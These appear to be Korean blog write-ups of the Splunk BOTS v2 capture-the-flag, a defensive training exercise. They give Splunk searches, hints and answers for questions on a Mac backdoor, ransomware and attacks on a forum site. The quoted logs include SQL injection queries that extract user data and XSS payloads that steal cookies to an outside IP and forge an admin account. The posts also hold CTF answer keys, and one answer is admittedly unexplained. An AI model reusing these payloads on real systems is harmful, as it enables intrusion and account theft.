transaction maxevents=2| table columns.target_path duration eventcount※ transaction함수는 이벤트간 시간차이를 duration이라는 변수를 통해 계산해주는 함수입니다.            columns.target_path      duration      eventcount                  /Users/mallorykraeusen/Desktop/.DS_Store.crypt/Users/mallorykraeusen/Downloads/Office 2016 Patcher.app      132      2      답 : 132307\tKevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory’s personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.Kevin Lagerfield는 USB 드라이브를 사용하여 Mallory의 개인 MacBook인 kutekitten에 멀웨어를 옮겼습니다. 그녀는 실행 중에 스스로를 난독화하는 맬웨어를 실행했습니다. Kevin이 사용했을 가능성이 있는 USB 드라이브의 공급업체 이름을 제공합니다. 답변 지침: 시간 상관 관계를 사용하여 USB 드라이브를 식별합니다.  hint#1    osquery_results is a great sourcetype to review.    osquery_results에서 찾아보세요.  hint#2    Look for unusual files in a place that Mallory would come across them.    Mallory가 발견할 수 있는 장소에서 특이한 파일을 찾으십시오.  hint#3    If you can figure out what kind of malware this is, do some open source intelligence research to determine how it behaves. Find an online database of USB vendors.이것이 어떤 종류의 맬웨어인지 알아낼 수 있다면 오픈 소스 인텔리전스 연구를 수행하여 작동 방식을 확인하십시오. USB 공급업체의 온라인 데이터베이스를 찾으십시오.  hint#4    Various sourcetypes can tell you how things look when the run. Look at 'ps' and look at 'osquery_results' from kutekitten.    다양한 소스 유형은 실행될 때 상황이 어떻게 보이는지 알려줄 수 있습니다. kutekitten의 'ps'와 'osquery_results'를 보세요.    해당 정보는 osquery관련 sourcetype에 있을것으로 추측됩니다. osquery는 실행중인 프로세스, 네트워크, 하드웨어 이벤트 등을 포함한 OS의 정보를 쿼리형식으로 질의하여 얻은 값을 갖고 있습니다.MACBook의 이름인 kutekitten, 그리고 usb를 키워드로 두고, osquery_result에서 조사해봅시다.sourcetype=osquery_results *kutekitten* *usb*columns.vendor_id라는 필드를 보면 058f, 13fe라는 값이 있습니다.columns.vendor_id이 있고, USB를 삽입한 데이터만 보도록 합시다.sourcetype=osquery_results *kutekitten* *usb* columns.vendor_id=* action=added이벤트 2개가 있습니다. 각 이벤트에 대해 탐색기간을 ±60초로 설정해두고, 어떤 파일을 반입했는지 확인해봅시다.첫번째로 vendor_id가 058f인 이벤트의 ±60초로 두고 반입된 파일의 hash값을 찾아봅시다.sourcetype=osquery_results *kutekitten*columns.sha256의 hash값을 virustotal에서 조회해봅시다.sha256 : befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271MAC BackDoor 악성코드입니다.제조사 13fe의 이벤트도 추가 조사해봅니다.columns.device의 값이 devfs인것을 보아하니, 파일이 아닌 드라이브임을 알 수 있습니다.악성코드를 반입한 USB의 제조사의 ID는 058f입니다. 구글에 해당 제조사의 ID를 검색해봅니다.vendorid 058f는 Alcor Micro Corp. 입니다.답 : Alcor308\tWhat programming language is at least part of the malware from the question above written in?위의 질문에서 악성 코드의 일부인 프로그래밍 언어는 무엇입니까?  hint#1    Review the hints for question 307.    문제 307에 대한 힌트를 검토하세요.문제 307번에서 발견한 악성코드의 sha256 해쉬값은 befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271입니다.해당 hash값으로 virustotal에서  자세한 정보를 파악해봅시다.Virustotal의 Detail탭의 FileType을 보면 Perl로 작성된 언어임을 알 수 있습니다.답 : Perl309\tThe malware from the two questions above appears as a specific process name in the process table when it is running. What is it?위의 두 질문에 대한 맬웨어는 실행 중일 때 프로세스 테이블에 특정 프로세스 이름으로 나타납니다. 그것은 무엇입니까?  hint#1    Review the hints for question 307.접근방식을 모르겠으니, 아시는분은 제보바랍니다.답 : java310\tThe malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&amp;C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?kutekitten을 감염시키는 악성코드는 설치 직후 2개의 C&amp;C 서버와 통신하기 위해 동적 DNS 대상을 사용합니다. 이러한 대상 중 첫 번째(알파벳 순)의 정규화된 도메인 이름(FQDN)은 무엇입니까?  hint#1    Have a look at the stream:dns sourcetype and observe queries from kutekitten.    stream:dns와 kutekitten이 요청한 쿼리를 보세요.  hint#2    You need a lookup. Find one, and also review this: https://www.splunk.com/blog/2015/08/04/detecting-dynamic-dns-domains-in-splunk.html    lookup이 필요합니다. https://www.splunk.com/blog/2015/08/04/detecting-dynamic-dns-domains-in-splunk.html를 참고하세요virustotal의 Realtions 탭을 보면, eidk.duckdns.org, eidk.hopto.org 두개 url이 악성으로 발견되어있습니다.철자 순서에 의해 답은 eidk.duckdns.org입니다.답 : eidk.duckdns.org311\tFrom the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&amp;C server?위의 질문에서 두 번째(알파벳순)로 연결된 C&amp;C 서버의 FQDN(정규화된 도메인 이름)은 무엇입니까?  hint#1    Review the hints for question 310.    문제 310에 대한 힌트를 검토하세요.답은 eidk.hopto.org 입니다.답 :  eidk.hopto.org312\tWhat is the average Alexa 1M rank of the domains between August 18 and August 19 that MACLORY-AIR13 tries to resolve while connected via VPN to the corporate network? Answer guidance: Round to two decimal places. Remember to include domains with no rank in your average! Answer example: 3.23 or 223234.918월 18일부터 8월 19일 사이에 MACLORY-AIR13이 VPN을 통해 기업 네트워크에 연결되어 있는 동안 해결하려고 하는 도메인의 평균 Alexa 1M 순위는 얼마입니까? 답변 안내: 소수점 이하 두 자리까지 반올림합니다. 평균에 순위가 없는 도메인을 포함하는 것을 잊지 마십시오! 답변 예: 3.23 또는 223234.91  hint#1    You're going to need a lookup. Are there any loaded in the system that might help you?    조회가 필요합니다. 당신을 도울 수 있는 시스템에 로드된 것이 있습니까?  hint#2    We want the average of ranks. Not the average of hits to the domains.    우리는 순위의 평균을 원합니다. 도메인에 대한 평균 조회수가 아닙니다.  hint#3    https://www.splunk.com/blog/2016/03/22/splunking-1-million-urls.html313\tTwo .jpg-formatted photos of Mallory exist in Kevin Lagerfield’s server home directory that have eight-character file names, not counting the .jpg extension. Both photos were encrypted by the ransomware. One of the photos can be downloaded at the following link, replacing 8CHARACTERS with the eight characters from the file name. https://splunk.box.com/v/8CHARACTERS After you download the file to your computer, decrypt the file using the encryption key used by the ransomware. What is the complete line of text in the photo, including any punctuation? Answer guidance: The encryption key can be found in Splunk..jpg 형식의 Mallory 사진 두 장이 Kevin Lagerfield의 서버 홈 디렉토리에 있으며 .jpg 확장자는 제외하고 파일 이름이 8자로 되어 있습니다. 두 사진 모두 랜섬웨어에 의해 암호화되었습니다. 사진 중 하나는 다음 링크에서 다운로드할 수 있으며 8CHARACTERS를 파일 이름의 8자로 대체합니다. https://splunk.box.com/v/8CHARACTERS 파일을 컴퓨터에 다운로드한 후 랜섬웨어에서 사용하는 암호화 키를 사용하여 파일을 해독합니다. 문장부호를 포함하여 사진의 전체 텍스트 줄은 무엇입니까? 답변 안내: 암호화 키는 Splunk에서 찾을 수 있습니다.  hint#1    Understanding from OSINT how this ransomware behaves is key to the answer.    OSINT에서 이 랜섬웨어가 어떻게 작동하는지 이해하는 것이 답의 핵심입니다.  hint#2    This ransomware is called 'Patcher' and it is terribly written and uses *NIX command line tools to wreak havoc.    이 랜섬웨어는 '패처'라고 불리며 끔찍하게 작성되었으며 *NIX 명령줄 도구를 사용하여 혼란을 일으키고 있습니다.  hint#3    Patcher uses the UNIX zip utility.    Patcher는 UNIX zip 유틸리티를 사용합니다.",
        "url": "/splunk-BOTS-v2-part3"
    }
    ,
    
    "splunk-bots-v2-part2": {
        "title": "splunk-bots-v2 write up(2)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과APT Scenarios:In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.Hunting Scenarios:PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTPExfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNSExfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.200\tWhat is the public IPv4 address of the server running www.brewertalk.com?www.brewertalk.com의 공개 IPv4 주소는 무엇입니까?  hint#1  Do you have access to a network diagram? If you do, use it!  네트워크 다이어그램에 액세스할 수 있습니까? 있으면, 사용하세요!  hint#2  A Splunk Stream forwarder running in the Frothly on-prem environment would observe http traffic destined for www.brewertalk.com as having an internet routable IP address.  Frothly 온프레미스 환경에서 실행되는 Splunk Stream forwarder는 www.brewertalk.com으로 향하는 http 트래픽이 인터넷 라우팅 가능한 IP 주소를 갖는 것으로 관찰합니다.stream:http에서 해당 URL로 검색한 후, dest_ip필드에서 찾을 가능성이 높습니다.sourcetype=stream:http www.brewertalk.com| dedup site dest_ip| table site dest_ip            site      dest_ip                  www.brewertalk.com      172.31.4.249              www.brewertalk.com      52.42.208.228              ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088      172.31.10.10              ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088      52.40.10.231              45.77.65.211:9999      45.77.65.211              brewertalk.com      172.31.4.249      www.brewertalk.com의 dest_ip의 값을 보면 172.31.4.249와 52.42.208.228이 있습니다.문제에서 공개IP를 물어봤으니 사설IP대역 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.답 : 52.42.208.228201\tProvide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.www.brewertalk.com에 대해 웹 취약점 스캔을 실행하는 데 사용되는 시스템의 IP 주소를 제공하십시오.  hint#1    App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.    앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.  hint#2    Drill down into contributing events if you can!    가능하면 기여 이벤트를 자세히 살펴보십시오!어떤 url들이 scan당했는지 조사해봅니다.sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249| stats count by urlhttp://www.brewertalk.com/숫자/형식으로 scan을 하고있습니다.해당 src_ip를 보면 45.77.65.211입니다.scan이면 request 횟수가 많을것입니다.www.berkbeer.com의 ip(52.42.208.228, 172.31.4.249)를 dest_ip로 설정하고 count해봅시다.쿼리결과를 토대로 검증해봅니다.(스캔치고 이벤트 수가 적습니다.)sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249| stats count by src_ip dest_ip| sort -count            src_ip      dest_ip      count                  45.77.65.211      172.31.4.249      9708              52.40.10.231      172.31.4.249      634              172.31.10.10      52.42.208.228      303              71.39.18.125      172.31.4.249      160              174.209.13.154      172.31.4.249      134              10.0.2.109      52.42.208.228      84              136.0.2.138      172.31.4.249      24              136.0.0.125      172.31.4.249      8      45.77.65.211의 이벤트가 가장 많습니다.45.77.65.211가 어떤 url들을 요청했는지 조사 합시다.sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249 src_ip=45.77.65.211| stats values(url) by src_ip답 : 45.77.65.211202\tThe IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php201번 문제의 IP 주소는 URI 경로를 공격하기 위해 다른 소프트웨어에서도 사용되고 있습니다. URI 경로는 무엇입니까? 답변 안내: 답변에 선행 슬래시를 포함하십시오. 쿼리 문자열이나 URI의 다른 부분을 포함하지 마십시오. 답변 예시: /phpinfo.php  hint#1    Analyze all HTTP traffic from the scanning system to www.brewertalk.com, and inspect the different HTTP user agents. A different HTTP user agent often indicates a different HTTP client program was in use.    스캐닝 시스템에서 www.brewertalk.com으로의 모든 HTTP 트래픽을 분석하고 다양한 HTTP 사용자 에이전트를 검사합니다. 다른 HTTP 사용자 에이전트는 종종 다른 HTTP 클라이언트 프로그램이 사용 중임을 나타냅니다.  hint#2    For each HTTP user agent, inspect the URI that the user agent is interacting with.    각 HTTP 사용자 에이전트에 대해 사용자 에이전트가 상호 작용하는 URI를 검사합니다.sourcetype=stream:http src_ip=45.77.65.211field중 uri_path 필드가 있으니, 어떤 uri가 있는지 봅시다.“/member.php”가 가장 많습니다. 어떤 특이사항이 있는지 봅시다.sourcetype=stream:http src_ip=45.77.65.211 uri_path=\"/member.php\"dest_content 필드의 내용을 보면 중간 SQL Injection의 흔적이 보입니다.SELECT q.*, s.sid\t\t\tFROM mybb_questionsessions s\t\t\tLEFT JOIN mybb_questions q ON (q.qid=s.qid)\t\t\tWHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1'/member.php uri에 SQL Injection 공격을 하고있는 것을 알 수 있습니다.답 : /member.php203\tWhat SQL function is being abused on the uri path from question 202?문제 202의 uri 경로에서 어떤 SQL 함수를 통해 침입시도를 하고 있습니까?  hint#1    SQL stands for Structured Query Language and it is used to interact with relational databases like mysql. Some common terms in SQL include 'SELECT' 'WHERE' 'FROM' and 'JOIN'.    SQL은 Structured Query Language의 약자로 mysql과 같은 관계형 데이터베이스와 상호 작용하는 데 사용됩니다. SQL의 일반적인 용어로는 'SELECT' 'WHERE' 'FROM' 및 'JOIN'이 있습니다.  hint#2    SQL injection vulnerabilities can arise when a programmer does not properly check user input for characters that might have an impact on how the underlying database query is assembled in his or her code. A single quote character provided as input to a web page ' is often a tell-tale sign of a SQL injection attack.    SQL injection 취약점은 프로그래머가 기본 데이터베이스 쿼리가 코드에서 어셈블되는 방식에 영향을 미칠 수 있는 문자에 대한 사용자 입력을 적절하게 확인하지 않을 때 발생할 수 있습니다. 웹 페이지에 대한 입력으로 제공되는 작은 따옴표 '는 종종 SQL 주입 공격을 알리는 신호입니다.  hint#3    XML is one of many data formats that can be stored in relational databases like mysql. Some SQL commands in the MySQL database can be used to produce an error that leaks database contents. Look for a SQL command that updates XML.    XML은 mysql과 같은 관계형 데이터베이스에 저장할 수 있는 많은 데이터 형식 중 하나입니다. MySQL 데이터베이스의 일부 SQL 명령을 사용하여 데이터베이스 내용을 누출하는 오류를 생성할 수 있습니다. XML을 업데이트하는 SQL 명령을 찾으십시오.문제 202에서 파악한 SQL에서 포함된 함수는 updatexml입니다.답 : updatexml204\tWhat is Frank Ester’s password salt value on www.brewertalk.com?www.brewertalk.com에서 Frank Ester의 비밀번호의 salt 값은 얼마입니까?  hint#1    Narrow down the events to only those that include the suspected SQL injection traffic. Stream HTTP events contain the details you need. Filter on the source IP, dest, IP, HTTP user agent and URI path.    의심되는 SQL injection 트래픽을 포함하는 이벤트로만 이벤트 범위를 좁힙니다. 스트림 HTTP 이벤트에는 필요한 세부 정보가 포함되어 있습니다. 소스 IP, 대상, IP, HTTP 사용자 에이전트 및 URI 경로를 필터링합니다.  hint#2    These events will probably make a lot more sense if you reverse the Splunk event ordering by piping your search results to the reverse command. This will show you the first SQL injection commands at the top of the list and later events below.    검색 결과를 reverse 명령으로 파이프하여 Splunk 이벤트 순서를 반대로 하면 이러한 이벤트가 훨씬 더 의미가 있을 것입니다. 이렇게 하면 목록 상단에 첫 번째 SQL injection 명령이 표시되고 아래에 이후 이벤트가 표시됩니다.  hint#3    There is a lot of data captured in these events. You are looking for two pieces of data in the dest_content field. The first can be found following the string 'XPATH syntax error: '    이러한 이벤트에는 많은 데이터가 캡처되어 있습니다. dest_content 필드에서 두 개의 데이터를 찾고 있습니다. 첫 번째는 'XPATH 구문 오류: ' 문자열 다음에서 찾을 수 있습니다.  hint#4    밑을 드래그하시면 힌트가 보입니다.    The other important piece of data in the dest_content field can be extracted with the following regular expression: ‘&lt;dt&gt;Query:&lt;/dt&gt;\\s+&lt;dd&gt;\\s+(?[^&lt;]+)' Look for the sqli_query values that are stealing salt values.    dest_content 필드의 다른 중요한 데이터는 다음 정규식으로 추출할 수 있습니다. '&lt;dt&gt;Query:&lt;/dt&gt;\\s+&lt;dd&gt;\\s+(?[^&lt;]+)' 솔트 값을 훔치는 sqli_query 값.&lt;/span&gt;문제 202번에서 사용했던 쿼리에 frank ester관련 키워드를 추가해봅시다.sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php *frank* OR *ester*dest_content필드의 중간 내용을 보면 username과 email을 알기위해 SQL injection 공격시도흔적이 보입니다.1. 결과&lt;dt&gt;SQL Error:&lt;/dt&gt;&lt;dd&gt;1105 - XPATH syntax error: ':frankesters47@gmail.com'&lt;/dd&gt;&lt;dt&gt;Query:&lt;/dt&gt;&lt;dd&gt;\t\t\tSELECT q.*, s.sid\t\t\tFROM mybb_questionsessions s\t\t\tLEFT JOIN mybb_questions q ON (q.qid=s.qid)\t\t\tWHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'\t\t&lt;/dd&gt;2. 결과&lt;dt&gt;SQL Error:&lt;/dt&gt;&lt;dd&gt;1105 - XPATH syntax error: ':frank'&lt;/dd&gt;&lt;dt&gt;Query:&lt;/dt&gt;&lt;dd&gt;\t\t\tSELECT q.*, s.sid\t\t\tFROM mybb_questionsessions s\t\t\tLEFT JOIN mybb_questions q ON (q.qid=s.qid)\t\t\tWHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'\t\t&lt;/dd&gt;첫번째는 eamil, 두번째는 username 조회시도를 하고있습니다. 해당 이벤트 시간을 기준으로 ±5초로 발생한 SQL문의 이벤트를 봅시다.sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php| rex field=dest_content \"&lt;dt&gt;Query:&lt;/dt&gt;\\s+&lt;dd&gt;\\s+(?&lt;sqli_query&gt;[^&lt;]+)\"| rex field=dest_content \"&lt;dd&gt;1105 - XPATH syntax error:\\s+(?&lt;sql_errcode&gt;[^&lt;]+)\"| search sqli_query=*| table _time sql_errcode sqli_query| sort _timesql_errcode 필드를 보면 아래차례대로 sql injection시도를 하고 있습니다.테이블명(mybb_users) -&gt; row수(6) -&gt; uid(1) -&gt; username의 길이(5) -&gt; 유저이름(frank) -&gt; email주소길이(23) -&gt; email(frankesters47@gmail.com) -&gt; salt길이(8) -&gt; salt(gGsxysZL) -&gt; 비밀번호 길이(32)답 : gGsxysZL205\tWhat is user btun’s password on brewertalk.com?berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?  hint#1    His hashed password and salt was stolen via SQLi and captured in Splunk. Also note a 'top 1000' password list is available in a Splunk lookup table file called 'top_1000.csv'. Use '| inputlookup top_1000.csv' to inspect it.    그의 해시된 암호와 slat값은 SQL injection을 통해 도난당했으며 Splunk에서 발견되었습니다. 또한 'top_1000.csv'라는 Splunk 조회 테이블 파일에서 '상위 1000' 암호 목록을 사용할 수 있습니다. 사용 '| inputlookup top_1000.csv'를 검사하여 검사합니다.  hint#2    By inspecting the code for this forum software, it can be determined that the stored password hash is computed as follows: md5( md5(salt) + md5(plaintext password) ) where '+' is simple string concatenation.    이 포럼 소프트웨어의 코드를 검사하여 저장된 암호 해시가 다음과 같이 계산되었음을 확인할 수 있습니다. md5(md5(salt) + md5(일반 텍스트 암호)) 여기서 '+'는 단순히 문자열 연결을 뜻합니다.  hint#3    The Splunk eval command includes an md5 hash function. Beware that the exploit used in this attack chops the final character from the password hash and includes it as a single character string in the next SQLi extraction. When you use this string, either add the character back to the end of the hash, or just use a wildcard match on the beginning of it.    Splunk eval 명령에는 md5 해시 함수가 포함되어 있습니다. 이 공격에 사용된 익스플로잇은 비밀번호 해시에서 최종 문자를 잘라내고 다음 SQLi 추출에서 단일 문자열로 포함한다는 점에 유의하십시오. 이 문자열을 사용할 때 해시 끝에 문자를 다시 추가하거나 시작 부분에 와일드카드 일치를 사용하십시오.  hint#4해당 질문은 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.206\tWhat are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.XSS 프로브가 표시하는 문자는 무엇입니까? 답변 안내: 현지어 또는 문자 집합으로 답변을 제출합니다.  hint#1    The attack is obscured in the logs by URL encoding.    공격은 URL 인코딩에 의해 로그에서 가려집니다.  hint#2    Splunk has the capability to URLdecode strings. Check your quick reference guide or Google for it.    Splunk에는 문자열을 URL 디코딩하는 기능이 있습니다. 빠른 참조 가이드 또는 Google을 확인하십시오.  hint#3    Try using | eval decoded_uri=urldecode(uri)    다음 SPL을 사용해보세요 | eval decoded_uri=urldecode(uri)  hint#4    Don't forget to check if others on your team have investigated this before.    팀의 다른 사람들이 전에 이것을 조사했는지 확인해보세요.XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다.sourcetype=stream:http \"&lt;script&gt;\"| dedup form_data| table _time form_data src_ip            _time      form_data      src_ip                  2017/08/16 15:19:17.163      module=user-titles&amp;action=edit&amp;utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E      71.39.18.125              2017/08/15 23:36:34.915      action=activate&amp;uid=-1&amp;code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E      71.39.18.125              2017/08/12 09:49:00.520      action=activate&amp;uid=-1&amp;code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E      136.0.0.125      내용이 base64인코딩되어 있습니다. urldecode함수를 통해 디코딩해봅시다.sourcetype=stream:http \"&lt;script&gt;\"| dedup form_data| eval decoded=urldecode(form_data) | table _time decoded src_ip쿼리 결과 중 ‘대동’이라는 글자를 발견할 수 있습니다.답 : 대동207\tWhat was the value of the cookie that Kevin’s browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키값은 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.  hint#1    Check out sourcetype=stream:http    sourcetype stream:http를 확인해보세요.  hint#2    Inspect the uri_query field.    uri_query 필드를 검사합니다.kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, “sourcetype=stream:http *kevin* \"&lt;script&gt;\" *cookie*1개의 검색결과가 나왔습니다.내용 중 class=”username”&gt;kevin&lt;/a&gt;&lt;/span&gt;라는 항목이 있는것을 보니 kevin과 관련된 이벤트입니다.또, cookie 필드값은 다음과 같습니다.mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0여러개의 값 중 lastvisit이 마지막 방문시 쓰였던 쿠키값임을 알 수 있습니다.답 : 1502408189208\tThe brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield’s computer and used to help create an unauthorized admin user on brewertalk.com?brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사용했습니다. Kevin Lagerfield의 컴퓨터에서 도난당하여 brewertalk.com에서 승인되지 않은 관리자를 생성하는 데 사용된 anti-CSRF 토큰 값은 무엇입니까?  hint#1    Anti-CSRF tokens are usually hidden form elements set when the browser loads an HTML page containing a form. If the form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction as it might have come from a malicious source rather than from a legitimate user of the form.    Anti-CSRF 토큰은 일반적으로 브라우저가 양식을 포함하는 HTML 페이지를 로드할 때 설정된 숨겨진 양식 요소입니다. 안티 CSRF 토큰 없이 양식을 제출하는 경우 웹사이트의 백엔드 코드는 해당 양식의 합법적인 사용자가 아닌 악의적인 소스에서 온 것일 수 있으므로 트랜잭션을 거부합니다.  hint#2    One of the many ways that an attacker can abuse a cross site scripting vulnerability is to use it to defeat CSRF protections. If you carefully inspect XSS attacks in the data set, you will stumble on some malicious code that is stealing the anti-CSRF token.    공격자가 크로스 사이트 스크립팅 취약점을 악용할 수 있는 여러 